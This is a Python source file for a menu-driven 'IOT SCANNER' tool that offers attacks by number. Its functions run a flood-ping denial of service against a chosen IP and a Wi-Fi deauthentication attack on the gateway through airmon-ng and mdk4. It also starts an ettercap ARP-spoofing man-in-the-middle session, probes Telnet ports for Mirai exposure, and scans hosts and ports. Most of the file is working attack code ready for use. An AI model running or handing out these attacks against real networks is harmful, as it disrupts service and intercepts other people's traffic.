import os
import pyfiglet
import scapy.all as scapy
import sys
import socket
from datetime import datetime
#Imported Libraries


#Dos on device code
def dos(ip):
    from subprocess import Popen, PIPE
    command="ping "+ip+" -f -s 65500"
    for i in range(30):
        Popen(["xterm", "-e",command], stdout=PIPE, stderr=PIPE, stdin=PIPE)


#Mirai attack code
def mirai_a(target):
    print("-" * 50)
    print("Scanning Target: " + target)
    print("Scanning started at:" + str(datetime.now()))
    print("-" * 50)
    try:
        port = 23
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        result = s.connect_ex((target, port))
        s.close()
        porti = 2323
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socket.setdefaulttimeout(1)
        resulti = s.connect_ex((target, porti))
        s.close()
        if result != 0 and resulti != 0:
            print("Device is not vulnerable to mirai attack")
        else:
            print("Device vulnerable")
    except KeyboardInterrupt:
        print("\n Exitting Program !!!!")
        sys.exit()
    except socket.gaierror:
        print("\n Hostname Could Not Be Resolved !!!!")
        sys.exit()
    except socket.error:
        print("\ Server not responding !!!!")
        sys.exit()


#Only port scanning code
def portscan(target):
    print("-" * 50)
    print("Scanning Target: " + target)
    print("Scanning started at:" + str(datetime.now()))
    print("-" * 50)
    try:
        for port in range(1, 65535):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            socket.setdefaulttimeout(1)
            result = s.connect_ex((target, port))
            if result == 0:
                print("Port {} is open".format(port))
            s.close()
    except KeyboardInterrupt:
        print("\n Exitting Program !!!!")
        sys.exit()
    except socket.gaierror:
        print("\n Hostname Could Not Be Resolved !!!!")
        sys.exit()
    except socket.error:
        print("\ Server not responding !!!!")
        sys.exit()


#host discovery code
def scan(ip):
    arp_req_frame = scapy.ARP(pdst=ip)
    broadcast_ether_frame = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    broadcast_ether_arp_req_frame = broadcast_ether_frame / arp_req_frame
    answered_list = scapy.srp(broadcast_ether_arp_req_frame, timeout=1, verbose=False)[0]
    result = []
    for i in range(0, len(answered_list)):
        client_dict = {"ip": answered_list[i][1].psrc, "mac": answered_list[i][1].hwsrc}
        result.append(client_dict)
    return result
def display_result(result):
    print("-----------------------------------\nIP Address\tMAC Address\n-----------------------------------")
    for i in result:
        print("{}\t{}".format(i["ip"], i["mac"]))
def start(ip):
    scanned_output = scan(ip)
    display_result(scanned_output)


#Dos attack on gateway
def ddos(interface):
    y = "xterm -hold -e sudo airmon-ng start " + interface
    os.system(y)
    os.system("xterm -hold -e sudo airmon-ng check kill")
    z = "xterm -hold -e sudo mdk4 " + interface + "mon" + " d"
    os.system("xterm -hold -e sudo mdk4 wlan0mon d")
    i = "xterm -hold -e sudo airmon-ng stop " + interface + "mon"
    os.system(i)
    os.system("sudo service network-manager restart")


#interface or main code.
def root():
    print("######################################################################")
    result = pyfiglet.figlet_format("IOT SCANNER", font="digital")
    print(result)
    print("######################################################################")
    print("1.Check your ip.")
    print("2.Explore targets.")
    print("3.Scan for Open Ports on target.")
    print("4.Ddos attack on the Gateway.")
    print("5.Man in the middle attack.")
    print("6.Check for Mirai attack.")
    print("7.Check for Ripple attack.")
    print("8.DOS attack on the device.")

    x = int(input("Choose attack: "))
    if x==1:
        os.system("xterm -hold -e sudo ifconfig")
        root()
    if x==2:
        ip=input("Enter your IP address with subnet. For eg:10.x.x.x/y: ")
        start(ip)
        root()
    if x==3:
        x=str(input("Enter IP address of target: "))
        portscan(x)
        root()
    if x==4:
        interface=str(input("Enter your Wifi Interface: "))
        ddos(interface)
        root()
    if x==5:
        inte=str(input("Enter your interface name: "))
        gateway=str(input("Enter gateway ip: "))
        targ=str(input("Enter device ip: "))
        q="sudo ettercap -T -S -i "+inte+" -M arp:remote /"+gateway+"// /"+targ+"//"
        os.system(q)
        root()
    if x==6:
        target=str(input("Enter IP address of the device to check: "))
        mirai_a(target)
        root()
    if x==7:
        print("Work in progress.")
    if x==8:
        ip=str(input("Enter target ip: "))
        dos(ip)
root()
